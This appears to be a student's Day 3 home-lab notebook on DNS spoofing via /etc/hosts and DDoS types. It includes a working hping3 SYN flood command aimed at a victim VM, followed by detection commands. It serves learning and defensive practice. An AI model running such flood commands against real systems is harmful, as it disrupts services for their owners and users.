# Day 3 — DNS Spoofing and DDoS

## Topics I covered
- DNS Spoofing
- DDoS Concepts and Types

## What I did

1. Changed /etc/hosts file to redirect a website
2. Verified the redirect with ping command
3. Learned about DDoS attacks and types

## My lab setup
Attacker: Kali Linux (192.168.1.53)
Victim: Ubauntu Server (192.168.1.38)

## Commands I run

Edit hosts file:
sudo nano /etc/hosts

Add this line:
127.0.0.1  facebook

Save and exit (Ctrl+X, Y, Enter)

Test the redirect:
ping facebook.com
In firefox browser facebook.com. This is LocalHost IP Address.

Output should show 127.0.0.1 instead of real IP.

To remove redirect:
sudo nano /etc/hosts
Delete the line I added.

## DDoS types I learned

1. Volume based — UDP flood, ICMP flood
2. Protocol based — SYN flood, Ping of Death
3. Application based — HTTP flood, Slowloris

## SYN FLOOD ATTACK

This Attack Starting before. I will check IP Address:-

Kali IP: 192.168.1.53
Ubuntu IP: 192.168.1.38


6. Check victim port status (on Ubuntu victim):
ss -tulpn | grep :80

7. Install hping3 
sudo apt install hping3 -y

8. Run SYN flood attack (on Kali attacker):
sudo hping3 -S --flood -p 80 VICTIM_IP

9. Check victim logs (on Ubuntu victim):
sudo tail -f /var/log/syslog

10. Stop attack:
Ctrl + C

DETECTION COMMANDS

11. Check network connections:
ss -tulpn

12. Check system load:
top

13. check log /var/log/syslog

## Screenshots
All screenshots in 01-Screenshots folder

## Commands
All commands in 02-Commands folder

## What I learned

- DNS spoofing redirects traffic to fake websites.
- /etc/hosts file is a simple way to test DNS spoofing.
- DDoS attacks have 3 main types — volume, protocol, application.
- SYN flood sends many SYN packets without completing handshake.
- In real SOC work, we look for many SYN packets with no ACK.

## Time
- Theory: 30 min
- Practical: 40 min
